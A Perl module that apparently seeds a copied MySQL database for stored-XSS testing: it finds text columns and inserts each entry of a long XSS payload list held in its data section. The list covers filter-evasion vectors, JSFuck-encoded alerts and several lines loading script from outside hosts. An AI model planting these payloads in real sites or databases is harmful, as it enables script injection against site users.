package DBAnalysis;

use strict;
use warnings;
use autodie;
use Data::Dumper;
use DBI;
use Try::Tiny;

sub debug {
	my $self = shift;
	my $str = shift;
	if($self->{debug}) {
		warn "$str\n";
	}
}

sub set_debug {
	my $self = shift;
	my $debug = shift // 0;
	$self->{debug} = $debug;
	return $self;
}

sub new {
	my $self = shift;
	my %data = @_;

	$self = bless \%data;

	$data{dbh} = DBI->connect("DBI:mysql:host=".$data{host}, $data{username}, $data{password}, {
			PrintError => 1,
			PrintWarn  => 1,
			RaiseError => 1,
			AutoCommit => 1
		}
	);

	my @injection_list = ();
	$self->debug("Filling XSS-array");
	while (my $xss = <DATA>) {
		push @injection_list, $xss;
		if($data{number_of_injections}) {
			last if @injection_list >= $data{number_of_injections};
		}
	}
	$data{injection_list} = \@injection_list;

	if($self->{copyfrom}) {
		$self->debug("Copying enabled. Copying database `".$self->{copyfrom}."` to `".$self->{dbname}."`");
		$self->_copy_db_from_to();
	}

	$self->debug("Running `use ".$self->{dbname}."`");
	$self->do("use ".$self->{dbname});

	return $self;
}

sub do {
	my $self = shift;
	my $query = shift;

	$self->debug("Doing query: $query");
	my $ret = $self->{dbh}->do($query);

	return $ret;
}

sub _run {
	my $self = shift;
	my $code = shift;
	$self->debug("code: $code");
	return system($code);
}

sub _copy_db_from_to {
	my $self = shift;
	my $from = $self->{copyfrom};
	my $to = $self->{dbname};

	my $tmp_file = "/tmp/dump.sql";
	my $login = "-hlocalhost -u".$self->{username}." -p$self->{password}";
	$self->_run("mysqldump $login $from > $tmp_file");
	$self->_run("mysqladmin $login create $to");
	$self->_run("mysql $login $to < $tmp_file");
	$self->_run("rm $tmp_file");

	return 1;
}

sub analyze_db {
	my $self = shift;

	$self->debug("Analyzing DB for vulnerable columns");
	$self->{vulnerable_columns} = $self->_get_vulerable_columns();
	$self->debug("Vulnerable columns found: \n".Dumper($self->{vulnerable_columns})."\n");

	$self->debug("Inserting values into vulnerable_columns");
	$self->_insert_values();
}

sub _insert_values {
	my $self = shift;

	my %tables = %{$self->{vulnerable_columns}};

	foreach my $this_table (sort { scalar(@{$tables{$a}}) cmp scalar(@{$tables{$b}}) } keys %tables) {
		if(_has_vulnerable_column(@{$tables{$this_table}})) {
			$self->debug("The table `$this_table` has vulnerable columns!!! Going through possible injections.");
			foreach my $xss (@{$self->{injection_list}}) {
				$self->debug("This possible injection: $xss");
				my $query = $self->_create_query($tables{$this_table}, $this_table, $xss);
				$self->debug("Possible injection query:\n$query\n");
				try {
					$self->do($query);
				} catch {
					$self->debug("got dbi error: $_");
				};
			}
		} else {
			$self->debug("The table `$this_table` has no vulnerable columns");
		}
	}
}

sub _create_query {
	my $self = shift;

	my $table = shift;
	my $this_table = shift;
	my $xss = shift;

	my $query = 'INSERT INTO '.$self->{dbname}.'.'.$this_table.' (';
	my @column_names = ();
	my @values = ();

	$self->debug("Going through vulnerable columns");
	foreach my $this_column (sort { $a cmp $b } @{$table}) {
		my $column_name = undef;
		if($this_column->{is_view}) {
			$self->debug(Dumper($this_column)." is a view. Thus, skipping it");
			next;
		}
		if($this_column->{is_nullable} eq 'NO') {
			$self->debug(Dumper($this_column)." is not nullable. It cannot be skipped.");
			$column_name = $this_column->{column};
		}

		if($this_column->{is_vulnerable}) {
			$self->debug(Dumper($this_column)." is vulnerable. It cannot be skipped.");
			$column_name = $this_column->{column};
		}

		my $value = undef;

		if (keys %{$this_column->{foreign_key_info}}) {
			$self->debug(Dumper($this_column)." is a foreign key. Getting any random foreign key for filling it without violating the database");
			$value = $self->_get_random_foreign_key($this_column);
		}

		if($this_column->{is_primary_key}) {
			$self->debug(Dumper($this_column)." is a primary key. Create a new value for it");
			($column_name, $value) = $self->_get_value($this_column, $this_table, $column_name, $xss);
		}

		if(!$value) {
			($column_name, $value) = $self->_get_value($this_column, $this_table, $column_name, $xss);
		}

		if(!$value) {
			$value = $xss;
		}

		$self->debug("$this_table: $this_column->{column}, has_value? ".($value ? 1 : 0));

		if($column_name) {
			if($value) {
				push @column_names, $column_name;
				push @values, $self->{dbh}->quote($value);
			} else {
				debug("Couldn't get value for $this_table: ".Dumper($this_column));
			}
		}
	}

	$query .= join(', ', @column_names).") VALUES (".join(', ', @values).") ON DUPLICATE KEY UPDATE ".join(", ", map { "$_=VALUES($_)" } @column_names);

	$self->debug("$query");

	return $query;
}

sub _get_value {
	my $self = shift;

	my $this_column = shift;
	my $this_table = shift;
	my $column_name = shift;
	my $xss = shift;

	my $value = undef;
	if (keys %{$this_column->{foreign_key_info}}) {
		$value = $self->_get_random_foreign_key($this_column);
	} elsif ($this_column->{is_autoincrement}) { # auto_increment macht sein eigenes ding beim einfügen
		$column_name = undef;
	} elsif (uc($this_column->{type}) =~ m#^(DATETIME|timestamp)$#i) {
		$value = "2000-10-01 10:10:10";
	} elsif (uc($this_column->{type}) eq 'DATE') {
		$value = "2000-10-01";
	} elsif ($this_column->{type} =~ m#^(?:varchar)$#i) {
		$value = $xss;
	} elsif ($this_column->{type} =~ m#^(?:int)$#i) {
		$value = $self->_get_random_nonexistant_int($this_table, $this_column->{column}, $this_column);
	} elsif ($this_column->{type} =~ m#^(?:double|float)$#i) {
		$value = '2.5';
	} elsif ($this_column->{type} =~ m#^(?:enum)#i) {
		$value = $self->_get_enum($this_table, $column_name, $this_column);
	} elsif ($this_column->{type} =~ m#^(?:text|binary|blob)#i) {
		$value = $xss;
	} else {
		$self->debug(Dumper $this_column);
		$self->debug("Cannot cope with this: $this_table.$column_name!");
	}

	return ($column_name, $value);
}

sub _get_foreign_key_info {
	my $self = shift;
	my $table = shift;
	my $column = shift;

	my $dbh = $self->{dbh};


	my $query = 'SELECT REFERENCED_TABLE_SCHEMA, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE WHERE CONSTRAINT_SCHEMA = '.$dbh->quote($self->{dbname}).' AND REFERENCED_TABLE_SCHEMA IS NOT NULL AND REFERENCED_TABLE_NAME IS NOT NULL AND TABLE_NAME = '.$dbh->quote($table).' AND COLUMN_NAME = '.$dbh->quote($column);
	
	my $sth = $dbh->prepare($query);
	$sth->execute();

	while (my ($referenced_table_schema, $referenced_table_name, $referenced_column_name) = $sth->fetchrow_array()) {
		return {
			referenced_table_schema => $referenced_table_schema,
			referenced_table_name => $referenced_table_name,
			referenced_column_name => $referenced_column_name
		};
	}

	return +{};
}

sub _get_enum {
	my $self = shift;

	my $this_table = shift;
	my $column_name = shift;
	my $table = shift;

	my $query = "SELECT COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = ".$self->{dbh}->quote($self->{dbname})." AND TABLE_NAME = ".$self->{dbh}->quote($this_table)." AND COLUMN_NAME = ".$self->{dbh}->quote($column_name);

	my $value = undef;
	my $enum_value = $self->{dbh}->selectrow_array($query);
	if($enum_value) {
		$enum_value =~ s#^enum\((.*)\)$#$1#gi;
		my @enum_values = map { s#^'##; s#'$##; $_; } split(/,/, $enum_value);

		if(!@enum_values) {
			$self->debug("Empty enum values for $this_table.$column_name");
			return undef;
		} else {
			$value = $enum_values[0];
			return $value;
		}
	} else {
		return undef;
	}
}

sub _get_random_nonexistant_int {
	my $self = shift;

	my $this_table = shift;
	my $column_name = shift;
	my $table = shift;

	my $found = 1;
	my $rand = 1 + int rand(10000);
	while ($found) {
		my $sth = $self->{dbh}->prepare("SELECT $column_name FROM $this_table WHERE $column_name = ".$self->{dbh}->quote($rand));
		$sth->execute;
		$found = $sth->rows;
		$rand = 1 + int rand(10000);
	}

	return $rand;
}

sub _get_random_foreign_key {
	my $self = shift;

	my $table = shift;

	my %foreign_keys = %{$table->{foreign_key_info}};
	my $query = 'SELECT '.$foreign_keys{referenced_column_name}.' FROM '.$foreign_keys{referenced_table_schema}.'.'.$foreign_keys{referenced_table_name}.' ORDER BY RAND() LIMIT 1';

	my $value = $self->{dbh}->selectrow_array($query);
	
	if($value) {
		return $value;
	} else {
		return undef;
	}
}

sub _has_vulnerable_column {
	my @table = @_;

	my $is_vulnerable = 0;

	foreach my $this_table (@table) {
		if($this_table->{is_vulnerable}) {
			return 1;
		}
	}

	return $is_vulnerable;
}

sub _get_vulerable_columns {
	my $self = shift;

	my $dbh = $self->{dbh};

	my @vulnerable_types = qw/varchar text binary char/;

	my %not_nullable = ();
	my %tables = ();
	my $query = "SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPE, IS_NULLABLE, COLUMN_KEY, EXTRA FROM INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = ".$dbh->quote($self->{dbname})." AND TABLE_NAME NOT IN (select TABLE_NAME from INFORMATION_SCHEMA.VIEWS WHERE TABLE_SCHEMA = ".$dbh->quote($self->{dbname}).");";
	my $sth = $dbh->prepare($query);
	$sth->execute();

	while (my ($table, $column, $type, $is_nullable, $column_key, $extra) = $sth->fetchrow_array()) {
		my $is_autoincrement = 0;
		if($extra eq 'auto_increment') {
			$is_autoincrement = 1;
		}
		my %this_column = (
			column => $column,
			type => $type,
			is_nullable => $is_nullable,
			is_vulnerable => 0,
			is_primary_key => 0,
			foreign_key_info => $self->_get_foreign_key_info($table, $column),
			is_autoincrement => $is_autoincrement
		);

		if($column_key eq 'PRI' || $column_key eq 'MUL') {
			$this_column{is_primary_key} = 1;
		}

		if(grep(/^$type$/, @vulnerable_types)) {
			$this_column{is_vulnerable} = 1;
		}

		push @{$tables{$table}}, \%this_column;
	}

	return \%tables;
}

1;

__DATA__
<script type="text/javascript">alert(1);</script>
"<script type="text/javascript">alert(1);</script>
javascript:alert(1);
alert`1`
alert&lpar;1&rpar;
alert&#x28;1&#x29
alert&#40;1&#41
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
navigator.vibrate(500)
eval(URL.slice(-8))>#alert(1)
eval(location.hash.slice(1)>#alert(1)
innerHTML=location.hash>#<script>alert(1)</script>
<svg onload=alert(1)>
"><svg onload=alert(1)//
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
'-alert(1)-'
'-alert(1)//
\'-alert(1)//
</script><svg onload=alert(1)>
<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this!
<x onmouseover=alert(1)>hover this!
<x onmouseup=alert(1)>click this!
<x contenteditable onpaste=alert(1)>paste here!
<script>alert(1)//
<script>alert(1)<!–
<script src=//brutelogic.com.br/1.js>
<script src=//3334957647/1>
%3Cx onxxx=alert(1)
<%78 onxxx=1
<x %6Fnxxx=1
<x o%6Exxx=1
<x on%78xx=1
<x onxxx%3D1
<X onxxx=1
<x OnXxx=1
<X OnXxx=1
<x onxxx=1 onxxx=1
<x/onxxx=1
<x%09onxxx=1
<x%0Aonxxx=1
<x%0Conxxx=1
<x%0Donxxx=1
<x%2Fonxxx=1
<x 1='1'onxxx=1
<x 1="1"onxxx=1
<x </onxxx=1
<x 1=">" onxxx=1
<http://onxxx%3D1/
<x onxxx=alert(1) 1='
<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
<script>alert(1)</script>
<script src=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>
"><img src=1 onerror=alert(1)>.gif
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
<script src="data:&comma;alert(1)//
"><script src=data:&comma;alert(1)//
<script src="//brutelogic.com.br&sol;1.js&num;
"><script src=//brutelogic.com.br&sol;1.js&num;
<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
<base href=//0>
<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><a href=#x>click this!#x
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
<body onscroll=alert(1)><br><br><br><br>
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! (MSIE)
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>
<script>window['alert'](document['domain'])<script>
<img src='1' onerror/=alert(0) />
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>
"><svg onload=alert(1)//
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
'-alert(1)-'
'-alert(1)//
\'-alert(1)//
</script><svg onload=alert(1)>
<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this!
<x onmouseover=alert(1)>hover this!
<x onmouseup=alert(1)>click this!
<x contenteditable onpaste=alert(1)>paste here!
<script>alert(1)//
<script>alert(1)<!–
<script src=//brutelogic.com.br/1.js>
<script src=//3334957647/1>
%3Cx onxxx=alert(1)
<%78 onxxx=1
<x %6Fnxxx=1
<x o%6Exxx=1
<x on%78xx=1
<x onxxx%3D1
<X onxxx=1
<x OnXxx=1
<X OnXxx=1
<x onxxx=1 onxxx=1
<x/onxxx=1
<x%09onxxx=1
<x%0Aonxxx=1
<x%0Conxxx=1
<x%0Donxxx=1
<x%2Fonxxx=1
<x 1='1'onxxx=1
<x 1="1"onxxx=1
<x </onxxx=1
<x 1=">" onxxx=1
<http://onxxx%3D1/
<x onxxx=alert(1) 1='
<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
<script>alert(1)</script>
<script src=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>
"><img src=1 onerror=alert(1)>.gif
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
<script src="data:&comma;alert(1)//
"><script src=data:&comma;alert(1)//
<script src="//brutelogic.com.br&sol;1.js&num;
"><script src=//brutelogic.com.br&sol;1.js&num;
<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
<base href=//0>
<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><a href=#x>click this!#x
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
<body onscroll=alert(1)><br><br><br><br>
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! (MSIE)
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
<<scr\0ipt/src=http://xss.com/xss.js></script
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
' onmouseover=alert(/Black.Spook/)
"><iframe%20src="http://google.com"%%203E
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
x”</title><img src%3dx onerror%3dalert(1)>
